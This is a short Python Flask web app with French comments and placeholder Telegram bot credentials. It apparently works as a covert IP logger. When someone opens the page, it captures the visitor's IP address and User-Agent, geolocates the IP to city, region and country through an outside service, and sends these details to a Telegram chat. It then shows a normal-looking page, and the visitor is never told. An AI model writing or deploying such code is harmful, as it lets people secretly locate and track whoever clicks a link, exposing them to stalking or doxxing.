
from flask import Flask, request, render_template
import requests
import telegram

app = Flask(__name__)

# Ton token et ton ID Telegram
BOT_TOKEN = 'TON_TOKEN_ICI'
CHAT_ID = 'TON_CHAT_ID_ICI'
bot = telegram.Bot(token=BOT_TOKEN)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    # Localisation de l'IP
    response = requests.get(f'https://ipapi.co/{ip}/json/')
    if response.status_code == 200:
        data = response.json()
        location = f"{data.get('city')}, {data.get('region')}, {data.get('country_name')}"
    else:
        location = "Localisation non trouvée"

    # Message à envoyer
    message = (
        f"NOUVELLE VISITE !\n\n"
        f"IP: {ip}\n"
        f"Localisation: {location}\n"
        f"User-Agent:\n{user_agent}"
    )
    bot.send_message(chat_id=CHAT_ID, text=message)

    return render_template("index.html")
